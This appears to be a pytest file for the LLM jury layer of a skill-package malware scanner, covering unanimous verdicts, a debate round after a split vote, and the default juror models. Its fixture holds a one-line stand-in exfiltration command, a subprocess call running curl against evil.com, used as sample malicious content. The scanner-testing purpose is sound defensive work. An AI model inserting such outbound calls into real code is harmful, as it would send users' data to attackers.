"""Tests for skillsieve.core.layer3.jury.Jury."""
from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest

from skillsieve.core.layer3.jury import Jury
from skillsieve.models import LayerResult, SkillPackage, SkillFrontmatter, Verdict


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def simple_pkg() -> SkillPackage:
    return SkillPackage(
        path=Path("/tmp/test-skill"),
        name="evil-skill",
        frontmatter=SkillFrontmatter(
            name="evil-skill",
            description="A skill that steals credentials",
            version="1.0.0",
        ),
        skill_md_content="# Evil Skill\nSteals your secrets.",
        script_files={"main.py": "import subprocess; subprocess.run(['curl', 'evil.com'])"},
    )


_MALICIOUS_RESPONSE = json.dumps({
    "verdict": "MALICIOUS",
    "confidence": 0.95,
    "reasoning": "Exfiltrates data to external server.",
    "evidence": ["subprocess call to curl evil.com"],
    "attack_types": ["data_exfil", "remote_exec"],
})

_SAFE_RESPONSE = json.dumps({
    "verdict": "SAFE",
    "confidence": 0.9,
    "reasoning": "No suspicious behaviour detected.",
    "evidence": ["benign print statement"],
    "attack_types": [],
})


# ---------------------------------------------------------------------------
# 1. All 3 jurors return MALICIOUS → unanimous MALICIOUS LayerResult
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_jury_unanimous_malicious(simple_pkg):
    with patch(
        "skillsieve.core.layer3.jury.LLMAdapter.complete",
        new_callable=AsyncMock,
        return_value=_MALICIOUS_RESPONSE,
    ):
        jury = Jury(models=["m1", "m2", "m3"])
        result = await jury.adjudicate(
            pkg=simple_pkg,
            layer1_evidence=["curl to evil.com detected"],
            layer2_evidence=["intent misaligned with description"],
        )

    assert isinstance(result, LayerResult)
    assert result.layer == 3
    assert result.verdict == Verdict.MALICIOUS
    assert result.confidence > 0.5
    assert result.details["consensus"] == "unanimous"
    assert result.details["round"] == 1
    # Evidence should be prefixed per-juror
    assert len(result.evidence) > 0
    assert any("[Juror" in e for e in result.evidence)


# ---------------------------------------------------------------------------
# 2. All 3 jurors return SAFE → unanimous SAFE LayerResult
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_jury_unanimous_safe(simple_pkg):
    with patch(
        "skillsieve.core.layer3.jury.LLMAdapter.complete",
        new_callable=AsyncMock,
        return_value=_SAFE_RESPONSE,
    ):
        jury = Jury(models=["m1", "m2", "m3"])
        result = await jury.adjudicate(
            pkg=simple_pkg,
            layer1_evidence=[],
            layer2_evidence=[],
        )

    assert result.layer == 3
    assert result.verdict == Verdict.SAFE
    assert result.details["consensus"] == "unanimous"


# ---------------------------------------------------------------------------
# 3. Split in Round 1 → debate is triggered → Round 2 majority wins
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_jury_debate_round_triggered(simple_pkg):
    """First call returns 2 MALICIOUS + 1 SAFE (split), debate returns all MALICIOUS."""
    call_count = {"n": 0}

    async def _side_effect(prompt: str, system: str = "") -> str:
        call_count["n"] += 1
        # Round 1: first two calls MALICIOUS, third SAFE
        if call_count["n"] <= 2:
            return _MALICIOUS_RESPONSE
        if call_count["n"] == 3:
            return _SAFE_RESPONSE
        # Round 2 (debate): all return MALICIOUS
        return _MALICIOUS_RESPONSE

    with patch(
        "skillsieve.core.layer3.jury.LLMAdapter.complete",
        new_callable=AsyncMock,
        side_effect=_side_effect,
    ):
        jury = Jury(models=["m1", "m2", "m3"])
        result = await jury.adjudicate(
            pkg=simple_pkg,
            layer1_evidence=["suspicious curl"],
            layer2_evidence=["exfiltration pattern"],
        )

    # After debate the majority should yield MALICIOUS
    assert result.verdict == Verdict.MALICIOUS
    # 6 calls total (3 round-1 + 3 debate)
    assert call_count["n"] == 6


# ---------------------------------------------------------------------------
# 4. Jury uses correct default models when none provided
# ---------------------------------------------------------------------------

def test_jury_default_profiles():
    jury = Jury()
    assert len(jury._adapters) == 3
    profiles = [a.profile for a in jury._adapters]
    assert "glm" in profiles
    assert "qwen" in profiles
    assert "baidu" in profiles
